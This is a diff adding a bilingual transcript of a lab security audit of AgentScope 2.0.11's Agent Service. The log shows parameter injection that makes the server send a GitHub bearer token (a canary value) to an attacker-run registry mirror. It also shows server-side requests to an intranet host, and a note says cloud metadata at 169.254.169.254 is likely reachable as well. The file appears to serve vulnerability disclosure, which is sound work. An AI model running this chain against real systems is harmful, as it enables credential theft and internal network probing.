@@ -1,0 +1,30 @@
+# Transcript of the original audit run against the UNMODIFIED AgentScope 2.0.11
+# Agent Service (2026-11-18, local lab). Labels are the Chinese ones shown in
+# screenshots 03 / 05 / 06, so this file and the figures agree; the repository's
+# own PoC (poc/exp_logic.py, poc/exp_github_hub.py) prints the same verdicts in
+# English. Private address masked as 172.16.x.x; token is a canary value.
+
+[GET /hub/mcp] -> 200 [{'hub_id': 'github', 'display_name': 'GitHub MCP Registry', 'description': "MCP servers published to GitHub's registry.", 'icon_url': 'https://avatars.githubusercontent.com/u/9919?s=64'}]
+[1+3][POST /chat -> cards] -> 500
+[1+3][cards/{card_id}] -> 500
+== REGISTRY MIRROR (攻击者自建 —— 捕获 Token 外带) ==
+[17:37:51] GET /v0/servers?limit=7&cursor=CURSOR-INJECTED-BY-ATTACKER UA=python-httpx/0.28.1 AUTH=Bearer ghp_CANARY_REDACTED_TOKEN body=b''
+[17:37:52] GET /v0/servers/CARD-ID-INJECTED-BY-ATTACKER UA=python-httpx/0.28.1 AUTH=Bearer ghp_CANARY_REDACTED_TOKEN body=b''
+
+[VERDICT] EFFECT1_TOKEN_EXFIL = True (Bearer ghp_CANARY_REDACTED_TOKEN)
+[VERDICT] EFFECT3_PARAM_INJECTION = True
+
+[setup] starting intranet instance :8002 (hub -> 172.16.x.x:18722, no token)
+[setup] intranet instance ready
+[2+4][intranet cards] -> 500
+== INTRANET PROBE (捕获服务器对内网发起的 GET) ==
+[17:38:10] GET /v0/servers?limit=3 UA=python-httpx/0.28.1 AUTH=- body=b''
+
+[VERDICT] EFFECT2_INTRANET_SSRF = True
+   GET /v0/servers?limit=3 UA=python-httpx/0.28.1 AUTH=(none)
+[VERDICT] EFFECT4_PURE_SSRF_NO_TOKEN = True (GET 仍发出，无 Authorization 头)
+
+[note] 云元数据（169.254.169.254）: 同链可达性 [Likely] —— _request 无目标地址校验，
+       httpx 直连任意 IP；本次以本地内网 probe 代替实测。
+
+[VERDICT] EXP_SUCCESS = True
